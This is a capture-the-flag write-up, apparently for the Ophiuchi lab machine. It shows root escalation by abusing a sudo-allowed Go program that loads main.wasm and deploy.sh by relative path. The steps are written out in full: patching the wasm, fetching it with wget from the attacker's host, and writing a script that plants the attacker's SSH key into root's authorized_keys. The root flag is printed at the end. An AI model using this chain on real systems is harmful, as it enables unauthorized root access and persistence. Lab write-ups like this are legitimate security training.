# Enumeration-

```bash
admin@ophiuchi:~$ sudo -l
Matching Defaults entries for admin on ophiuchi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on ophiuchi:
    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
```

### Lets see what the file does-

```bash
admin@ophiuchi:~$ cat /opt/wasm-functions/index.go 
package main

import (
        "fmt"
        wasm "github.com/wasmerio/wasmer-go/wasmer"
        "os/exec"
        "log"
)


func main() {
        bytes, _ := wasm.ReadBytes("main.wasm")

        instance, _ := wasm.NewInstance(bytes)
        defer instance.Close()
        init := instance.Exports["info"]
        result,_ := init()
        f := result.String()
        if (f != "1") {
                fmt.Println("Not ready to deploy")
        } else {
                fmt.Println("Ready to deploy")
                out, err := exec.Command("/bin/sh", "deploy.sh").Output()
                if err != nil {
                        log.Fatal(err)
                }
                fmt.Println(string(out))
        }
}
```

### Its reading from main.wasm file and then if it's not equal to 1 it prints not ready to deploy else it executes deploy.sh with /bin/sh

### What’s notable here is that absolute path is not used for `main.wasm` and the `deploy.sh` files. So we can manipulate these. These files will be read from our current working directory, from where we run the `index.go` file.


### Lets check the main.wasm file-

```bash
admin@ophiuchi:/opt/wasm-functions$ ls
backup  deploy.sh  index  index.go  main.wasm
admin@ophiuchi:/opt/wasm-functions$ file main.wasm 
main.wasm: WebAssembly (wasm) binary module version 0x1 (MVP)
```

### Transfer it to local machine to analyze-

![[Pasted image 20210620185107.png]]

### Upload the file [here](https://webassembly.github.io/wabt/demo/wasm2wat/index.html) to decode

```bash
(module
  (type $t0 (func (result i32)))
  (func $info (export "info") (type $t0) (result i32)
    (i32.const 0))
  (table $T0 1 1 funcref)
  (memory $memory (export "memory") 16)
  (global $g0 (mut i32) (i32.const 1048576))
  (global $__data_end (export "__data_end") i32 (i32.const 1048576))
  (global $__heap_base (export "__heap_base") i32 (i32.const 1048576)))
```

### Here its 0(i32.const 0)),lets change it to 1 (so the else part of the code executes xD) copy the code & paste it [here](https://webassembly.github.io/wabt/demo/wat2wasm/index.html) and download it.

```bash
(module
  (type $t0 (func (result i32)))
  (func $info (export "info") (type $t0) (result i32)
    (i32.const 1))
  (table $T0 1 1 funcref)
  (memory $memory (export "memory") 16)
  (global $g0 (mut i32) (i32.const 1048576))
  (global $__data_end (export "__data_end") i32 (i32.const 1048576))
  (global $__heap_base (export "__heap_base") i32 (i32.const 1048576)))
```

![[Pasted image 20210620190717.png]]


### Transfer the new main.wasm file to the box-
```bash
admin@ophiuchi:/tmp$ wget http://10.10.14.20:8500/test.wasm                                                                                                   
--2021-06-20 23:21:17--  http://10.10.14.20:8500/test.wasm                                                                                                    
Connecting to 10.10.14.20:8500... connected.                                                                                                                  
HTTP request sent, awaiting response... 200 OK                                                                                                                
Length: 190 [application/wasm]                                                                                                                                
Saving to: ‘test.wasm’                                                                                                                                        

test.wasm                               100%[=============================================================================>]     190  --.-KB/s    in 0.002s  

2021-06-20 23:21:17 (84.5 KB/s) - ‘test.wasm’ saved [190/190]
admin@ophiuchi:/tmp$ mv test.wasm main.wasm
```
### Create a new deploy.sh file with your publich ssh-key in it-
```bash
admin@ophiuchi:/tmp$ echo 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCmmL5+11eYuzK+n2BDL1FIh09/3yv38p706ufalDONolGLyckqHg6hjjfjKJsENs5jBXZBt2gS/UcmQGcMhvivJcikqPCl0KZ0djyajpYLYVC92gephA9fmgaMnGTds9wWB9aBH4xk/DcK1DkxLWIU054PugGiYXd/WyFCo4fZ3Z6awTPyTY47dTlASlt/YGRyhc4E2nH8dyuFlU0C8YcNUanatflhV/roMm0QPUosJx9K2AdK9ca65il1XmqjnXv08iBjV1fACXmkfpibDRXjRXUElcjPHJFspC0eCwTZD3MbLEMDZ41FeNL9aWVVKid3tvu3ckDvn2Bf45xBS72PwNvTk1zgnifbPu0J9axfD4BCNdeZeNhbaxDCDVwXMdSak7qWyGrprbOjVc6z7+0eLPFAs4HzcyFccsoDdFmf1eaf3Fz9ypvJKrTaJZpGUK7Ui0rE/ALMzqRzFeu9hoyf8iPY2dPTpO3XX/wduA4fWqsLGaZgdf5+akC8fLbJVwU= root@napster" > /root/.ssh/authorized_keys' >> deploy.sh
```

### Execute-
```bash
admin@ophiuchi:/tmp$ sudo -u root /usr/bin/go run /opt/wasm-functions/index.go
Ready to deploy
```


![[Pasted image 20210620192833.png]]


# Root.txt-

```bash
root@ophiuchi:~# ls -la
total 44
drwx------  8 root root 4096 Jan  7 09:10 .
drwxr-xr-x 20 root root 4096 Feb  5 18:10 ..
lrwxrwxrwx  1 root root    9 Oct 14  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root 4096 Oct 19  2020 .cache
drwxr-xr-x  4 root root 4096 Oct 14  2020 .cargo
drwxr-xr-x  4 root root 4096 Oct 14  2020 go
drwxr-xr-x  3 root root 4096 Oct 12  2020 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-r--------  1 root root   33 Jun 20 19:46 root.txt
drwxr-xr-x  3 root root 4096 Oct 11  2020 snap
drwx------  2 root root 4096 Oct 11  2020 .ssh
lrwxrwxrwx  1 root root    9 Jan  7 09:10 .viminfo -> /dev/null
root@ophiuchi:~# cat root.txt 
a7c3fdc7c400ee8fa2a9a28b89087e22
```


PAWNED!!!